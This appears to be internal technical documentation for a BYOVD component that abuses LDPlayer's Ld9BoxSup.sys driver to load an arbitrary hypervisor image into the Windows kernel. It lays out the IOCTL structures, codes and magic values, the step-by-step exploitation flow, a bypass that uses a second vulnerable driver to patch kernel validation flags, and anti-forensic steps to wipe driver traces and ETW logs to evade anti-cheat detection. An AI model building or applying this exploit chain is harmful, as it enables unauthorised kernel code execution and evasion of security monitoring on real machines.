# BYOVD: Ld9BoxSup.sys Interface Component

## VERIFICATION STATUS
```
VERIFICATION:
- [x] I read every file mentioned in this document
- [x] I verified all function signatures against actual code
- [x] I verified all data structures against actual definitions
- [x] I verified all dependencies against actual imports
- [ ] I tested or traced all claimed behaviors

UNVERIFIED CLAIMS:
- Actual IOCTL behavior on real driver
- Version probing success rates
- -618 bypass effectiveness

ASSUMPTIONS:
- Ld9BoxSup.sys is LDPlayer's VirtualBox fork
- IOCTL codes match VirtualBox SUPDrv
```

## DOCUMENTED FROM
```
Git hash: 73853be
Date: 2025-12-27
Files read: supdrv.c, supdrv.h, supdrv_types.h, nt_defs.h, deployer.c
```

---

## Component Overview

**Location**: `hypervisor/usermode/byovd/`

**Purpose**: Exploits the Ld9BoxSup.sys vulnerable driver (from LDPlayer, a VirtualBox fork) to load arbitrary code into kernel space.

**Inputs**:
- Driver file path (or deployed driver)
- Hypervisor PE image
- Target entry point

**Outputs**:
- Kernel memory allocation (R3+R0 dual mapping)
- Kernel code execution via entry point call

---

## File Breakdown

| File | Lines | Purpose |
|------|-------|---------|
| `supdrv.c` | ~500 | Core Ld9BoxSup.sys interface |
| `supdrv.h` | ~225 | Function prototypes, context structure |
| `supdrv_types.h` | ~400 | IOCTL structures (SUPCOOKIE, SUPLDROPEN, etc.) |
| `nt_defs.h` | ~150 | NT function definitions (NtCreateFile, etc.) |
| `deployer.c` | ~300 | Driver deployment and loading |
| `crypto.c` | ~100 | Driver encryption/decryption |
| `nt_helpers.c` | ~80 | NT function wrappers |
| `types.h` | ~50 | Basic type definitions |

---

## Core Data Structures

### SUPDRV_CTX (VERIFIED from `supdrv.h`)

```c
typedef struct _SUPDRV_CTX {
    HANDLE   hDevice;               // Device handle from NtCreateFile
    UINT32   Cookie;                // Session cookie from SUP_IOCTL_COOKIE
    UINT32   SessionCookie;         // Session-specific cookie
    UINT64   pSession;              // Kernel session pointer
    UINT32   DetectedVersion;       // Detected driver version
    bool     bInitialized;          // Session established
    wchar_t  wszDeviceName[64];     // Device path that worked
    char     szLastError[256];      // Last error message
} SUPDRV_CTX;
```

### SUPREQHDR (VERIFIED from `supdrv_types.h`)

```c
typedef struct _SUPREQHDR {
    UINT32  u32Cookie;          // Session cookie
    UINT32  u32SessionCookie;   // Session-specific cookie
    UINT32  cbIn;               // Input buffer size
    UINT32  cbOut;              // Output buffer size
    UINT32  fFlags;             // Flags (SUPREQHDR_FLAGS_MAGIC)
    INT32   rc;                 // Return code (VINF_SUCCESS = 0)
} SUPREQHDR;

#define SUPREQHDR_FLAGS_MAGIC  0x42

// Return codes
#define VINF_SUCCESS           0
#define VERR_NOT_SUPPORTED    -12   // MSR_PROBER disabled
#define VERR_GENERAL_FAILURE  -1
```

### SUPCOOKIE (VERIFIED from `supdrv_types.h`)

```c
typedef struct _SUPCOOKIE {
    SUPREQHDR Hdr;
    union {
        struct {
            char    szMagic[16];        // "The Magic Word!"
            UINT32  u32ReqVersion;      // Requested version
            UINT32  u32MinVersion;      // Minimum acceptable version
        } In;
        struct {
            UINT32  u32Cookie;          // Output: Session cookie
            UINT32  u32SessionCookie;   // Output: Session-specific cookie
            UINT32  u32SessionVersion;  // Output: Session version
            UINT32  u32DriverVersion;   // Output: Driver version
            UINT32  cFunctions;         // Output: Function count
            UINT64  pSession;           // Output: Kernel session pointer
        } Out;
    } u;
} SUPCOOKIE;

#define SUPCOOKIE_INITIAL_COOKIE  0x69726F74  // "tori" (LDPlayer variant)
#define SUPCOOKIE_MAGIC           "The Magic Word!"
#define SUPCOOKIE_MAGIC_LEN       16
```

### SUPLDROPEN (VERIFIED from `supdrv_types.h`)

```c
typedef struct _SUPLDROPEN {
    SUPREQHDR Hdr;
    union {
        struct {
            UINT32  cbImageWithTabs;    // Image size with symbol tables
            UINT32  cbImageBits;        // Image size without symbols
            char    szName[32];         // Module name
            char    szFilename[260];    // Full path (fake)
        } In;
        struct {
            void*   pvImageBase;        // Output: Kernel address
            UINT8   fNeedsLoading;      // Output: Needs LDR_LOAD?
        } Out;
    } u;
} SUPLDROPEN;

#define LDR_OPEN_SIZE_IN   328
#define LDR_OPEN_SIZE_OUT  40
```

### SUPLDRLOAD (VERIFIED from `supdrv_types.h`)

```c
typedef struct _SUPLDRLOAD {
    SUPREQHDR Hdr;
    union {
        struct {
            void*   pvImageBase;        // From LDR_OPEN
            UINT32  cbImageWithTabs;    // Image size
            UINT32  cbImageBits;        // Image size
            UINT32  offSymbols;         // Symbol table offset
            UINT32  cSymbols;           // Symbol count
            UINT32  offStrTab;          // String table offset
            UINT32  cbStrTab;           // String table size
            UINT32  eEPType;            // Entry point type
            void*   pfnModuleInit;      // Entry point function
            void*   pfnModuleTerm;      // Termination function
            void*   pvVMMR0;            // VMM R0 pointer (unused)
            void*   pvVMMR0EntryFast;   // Fast entry (unused)
            void*   pvVMMR0EntryEx;     // Extended entry (unused)
            UINT8   abImage[];          // Image data (variable)
        } In;
        // No output fields
    } u;
} SUPLDRLOAD;

typedef enum {
    SUPLDRLOADEP_NOTHING = 0,   // Don't call entry point
    SUPLDRLOADEP_SERVICE = 1,   // Call as service routine
} SUPLDRLOADEP;

#define SUP_IOCTL_LDR_LOAD_SIZE_IN(cbImage)  (sizeof(SUPREQHDR) + 80 + cbImage)
#define SUP_IOCTL_LDR_LOAD_SIZE_OUT          sizeof(SUPREQHDR)
```

---

## Key Functions

### Initialization

```c
/**
 * Initialize SUPDrv context
 * @param ctx Context to initialize
 *
 * VERIFIED: Zeros structure, sets hDevice to INVALID_HANDLE_VALUE
 */
void SupDrv_Init(PSUPDRV_CTX ctx);

/**
 * Full initialization: open device + cookie handshake
 * @param ctx Context
 * @return true on success
 *
 * VERIFIED: Calls TryOpenDevice, then ProbeVersion
 */
bool SupDrv_Initialize(PSUPDRV_CTX ctx);

/**
 * Cleanup context
 * @param ctx Context
 *
 * VERIFIED: Closes handle, clears state
 */
void SupDrv_Cleanup(PSUPDRV_CTX ctx);
```

### Device Opening

```c
/**
 * Try to open SUPDrv device
 * @param ctx Context
 * @return true if device opened
 *
 * VERIFIED: Tries \Device\Ld9BoxDrv, \Device\Ld9BoxDrvU, \Device\VBoxDrv
 * CRITICAL: Uses NtCreateFile - driver has no DOS symlink!
 */
bool SupDrv_TryOpenDevice(PSUPDRV_CTX ctx);
```

### Cookie Handshake

```c
/**
 * Try cookie handshake with specific version
 * @param ctx Context
 * @param u32Version Version to try
 * @return true if handshake succeeded
 *
 * VERIFIED: Sends SUP_IOCTL_COOKIE with magic and version
 */
bool SupDrv_TryCookie(PSUPDRV_CTX ctx, UINT32 u32Version);

/**
 * Probe for working driver version
 * @param ctx Context
 * @return true if any version worked
 *
 * VERIFIED: Tries KNOWN_VERSIONS[] array until one succeeds
 */
bool SupDrv_ProbeVersion(PSUPDRV_CTX ctx);

// Known versions (VERIFIED from supdrv_types.h)
static const UINT32 KNOWN_VERSIONS[] = {
    0x00320000,  // LDPlayer 9.x
    0x00310000,  // LDPlayer 9.x older
    0x00300000,  // LDPlayer 4.x
    0x00240000,  // VirtualBox 6.x
    // ... more versions
};
```

### Memory Allocation

```c
/**
 * Allocate pages with dual R3/R0 mapping
 * This is the KEY PRIMITIVE for code injection!
 *
 * @param ctx Context
 * @param cPages Number of 4KB pages
 * @param ppvR3 Output: Usermode-writable address
 * @param ppvR0 Output: Kernel-executable address
 * @return true on success
 *
 * VERIFIED: Sends SUP_IOCTL_PAGE_ALLOC_EX
 * CAPABILITY: Write to R3, execute at R0 - code injection!
 */
bool SupDrv_PageAllocEx(PSUPDRV_CTX ctx, UINT32 cPages,
                         void** ppvR3, void** ppvR0);

/**
 * Free pages
 * @param ctx Context
 * @param pvR3 Ring-3 address from PageAllocEx
 * @return true on success
 */
bool SupDrv_PageFree(PSUPDRV_CTX ctx, void* pvR3);
```

### Module Loading

```c
/**
 * Open module for loading
 * Allocates kernel memory for the module.
 *
 * @param ctx Context
 * @param cbImage Image size in bytes
 * @param ppvImageBase Output: Kernel address
 * @return true on success
 *
 * VERIFIED: Sends SUP_IOCTL_LDR_OPEN
 * NOTE: Returns -618 in nested virtualization!
 */
bool SupDrv_LdrOpen(PSUPDRV_CTX ctx, UINT32 cbImage, void** ppvImageBase);

/**
 * Load module into kernel
 * Copies image and optionally calls entry point.
 *
 * @param ctx Context
 * @param pvImageBase Kernel address from LdrOpen
 * @param pvImage Image data (already relocated)
 * @param cbImage Image size
 * @param pfnEntry Entry point to call (or NULL)
 * @return true on success
 *
 * VERIFIED: Sends SUP_IOCTL_LDR_LOAD
 * CRITICAL: Driver copies image, then calls entry point in Ring 0!
 */
bool SupDrv_LdrLoad(PSUPDRV_CTX ctx, void* pvImageBase, const void* pvImage,
                    UINT32 cbImage, void* pfnEntry);
```

### MSR Access (DISABLED)

```c
/**
 * Read MSR value
 * NOTE: DISABLED in LDPlayer - returns VERR_NOT_SUPPORTED (-12)
 *
 * @param ctx Context
 * @param uMsr MSR number
 * @param puValue Output: MSR value
 * @param idCpu Target CPU
 * @return true on success, false if disabled
 *
 * VERIFIED: Sends SUP_IOCTL_MSR_PROBER
 * LIMITATION: Returns false with rc=-12 on LDPlayer
 */
bool SupDrv_MsrRead(PSUPDRV_CTX ctx, UINT32 uMsr, UINT64* puValue, UINT32 idCpu);

bool SupDrv_MsrWrite(PSUPDRV_CTX ctx, UINT32 uMsr, UINT64 uValue, UINT32 idCpu);
```

---

## IOCTL Reference

| IOCTL | Code | In Size | Out Size | Purpose |
|-------|------|---------|----------|---------|
| `SUP_IOCTL_COOKIE` | 0x22A004 | 48 | 56 | Cookie handshake |
| `SUP_IOCTL_PAGE_ALLOC_EX` | 0x22A024 | variable | variable | Dual R3/R0 memory |
| `SUP_IOCTL_PAGE_FREE` | 0x22A028 | 24 | 24 | Free pages |
| `SUP_IOCTL_LDR_OPEN` | 0x22A038 | 328 | 40 | Open module |
| `SUP_IOCTL_LDR_LOAD` | 0x22A03C | variable | 24 | Load module |
| `SUP_IOCTL_LDR_FREE` | 0x22A040 | 24 | 24 | Free module |
| `SUP_IOCTL_MSR_PROBER` | 0x22A080 | variable | variable | MSR access (DISABLED) |

---

## Exploitation Flow

### Normal Flow

```
1. SupDrv_Init(&ctx)
   - Zero context
   - Set hDevice = INVALID_HANDLE_VALUE

2. SupDrv_Initialize(&ctx)
   |
   +-- SupDrv_TryOpenDevice(&ctx)
   |   +-- NtCreateFile(\Device\Ld9BoxDrv, ...)
   |   +-- Success: Save handle
   |
   +-- SupDrv_ProbeVersion(&ctx)
       +-- For each KNOWN_VERSION:
           +-- SupDrv_TryCookie(ctx, version)
               +-- Build SUPCOOKIE request
               +-- Initial cookie: 0x69726F74 ("tori")
               +-- Magic: "The Magic Word!"
               +-- Version: current probe
               +-- DeviceIoControl(SUP_IOCTL_COOKIE)
               +-- If rc == VINF_SUCCESS:
                   +-- Save Cookie, SessionCookie, pSession
                   +-- Return true

3. SupDrv_LdrOpen(&ctx, imageSize, &kernelAddr)
   +-- Build SUPLDROPEN request
   +-- szName: "SysCore" (obfuscated)
   +-- szFilename: "C:\Windows\System32\drivers\syscore.sys"
   +-- DeviceIoControl(SUP_IOCTL_LDR_OPEN)
   +-- Receive pvImageBase (kernel address)

4. Map hypervisor to usermode buffer:
   +-- Allocate usermode buffer
   +-- Copy sections per PE headers
   +-- Apply relocations (base = kernelAddr)
   +-- Resolve imports
   +-- Wipe PE headers

5. SupDrv_LdrLoad(&ctx, kernelAddr, mappedImage, size, entryPoint)
   +-- Build SUPLDRLOAD request
   +-- eEPType = SUPLDRLOADEP_SERVICE
   +-- pfnModuleInit = entryPoint
   +-- abImage = mappedImage
   +-- DeviceIoControl(SUP_IOCTL_LDR_LOAD)
   +-- Driver copies image to kernel
   +-- Driver calls entryPoint in Ring 0
   +-- HYPERVISOR IS NOW RUNNING!
```

### -618 Error and Bypass

```
Problem:
  SupDrv_LdrOpen returns rc=-618 when running in nested virtualization
  (e.g., inside VMware, Hyper-V, or another hypervisor)

Cause:
  Driver validates modules via PsLoadedModuleList enumeration
  Nested VM changes EPROCESS/module list behavior
  Validation fails, returns -618

Bypass (MENTIONED in CLAUDE.md, not verified in code):
  1. Load ThrottleStop vulnerable driver
  2. ThrottleStop provides physical memory R/W
  3. Scan physical 0x1a2000-0x1b0000 for SYSTEM EPROCESS
  4. Read CR3 from DirectoryTableBase (+0x28)
  5. Walk page tables to find validation flag VAs
  6. Write 0x01 to ntoskrnl flag (offset 0x4a1a0)
  7. Write 0x01 to hal flag (offset 0x4a210)
  8. Unload ThrottleStop (~10-15ms window)
  9. Ld9BoxSup.sys LDR_OPEN now succeeds
```

---

## Error Handling

### Error Message Capture

```c
static void SupDrv_SetError(PSUPDRV_CTX ctx, const char* format, ...) {
    va_list args;
    va_start(args, format);
    vsnprintf(ctx->szLastError, sizeof(ctx->szLastError), format, args);
    va_end(args);
    DbgLog("ERROR: %s", ctx->szLastError);
}

const char* SupDrv_GetLastError(PSUPDRV_CTX ctx) {
    return ctx->szLastError;
}
```

### Common Error Codes

| Code | Name | Meaning |
|------|------|---------|
| 0 | VINF_SUCCESS | Operation succeeded |
| -1 | VERR_GENERAL_FAILURE | Generic failure |
| -12 | VERR_NOT_SUPPORTED | MSR_PROBER disabled |
| -618 | VERR_??? | Validation failure in nested VM |

---

## Dependencies

### Internal Dependencies

```
supdrv.c
  +-- supdrv.h (SUPDRV_CTX, function prototypes)
  +-- supdrv_types.h (IOCTL structures)
  +-- nt_defs.h (NtCreateFile, etc.)
  +-- ../obfuscate.h (DEC_OMBRAHV for module names)
```

### External Dependencies

```
Windows API:
  - DeviceIoControl (kernel32.dll)
  - CloseHandle (kernel32.dll)
  - HeapAlloc/HeapFree (kernel32.dll)
  - GetLastError (kernel32.dll)

NT API (resolved at runtime):
  - NtCreateFile (ntdll.dll)
  - NtDeviceIoControlFile (ntdll.dll)
```

---

## Security Considerations

### Detection Surface

1. **Driver Loading**: Ld9BoxSup.sys must be loaded first
   - May be blocked by driver signature enforcement (DSE)
   - May be detected by anti-cheat driver blocklists
   - LDPlayer installation provides legitimate cover

2. **Device Handle**: Opening \Device\Ld9BoxDrv is logged
   - ETW may capture device open events
   - Anti-cheat may monitor device access

3. **Memory Allocation**: PageAllocEx creates dual-mapped memory
   - BigPool allocations may be scanned
   - PML4E scans detect orphaned executable pages

### Mitigation Notes (from CLAUDE.md)

- Clear `MmUnloadedDrivers` after exploitation
- Clear `PiDDBCacheTable` hash entry
- Wipe ETW circular buffers
- Delete prefetch files
- Use EPT to hide hypervisor memory from page table scans

---

## CONCERNS

### Potential Issues
- Cookie handshake may fail on unknown driver versions
- -618 bypass requires additional vulnerable driver
- MSR_PROBER disabled limits some operations
- No cleanup of Ld9BoxSup.sys registry artifacts

### Missing Features
- No automatic driver deployment/loading
- No signature bypass (relies on pre-installed driver)
- No -618 bypass implementation in reviewed code

---

## GAPS AND UNKNOWNS

- [ ] Exact driver blocklist status of Ld9BoxSup.sys
- [ ] Whether ThrottleStop bypass is implemented
- [ ] How driver is deployed to target system
- [ ] Cleanup procedures after exploitation

---

*Component documentation generated 2025-12-27*
*CONFIDENCE: HIGH for interface, MEDIUM for exploitation effectiveness*
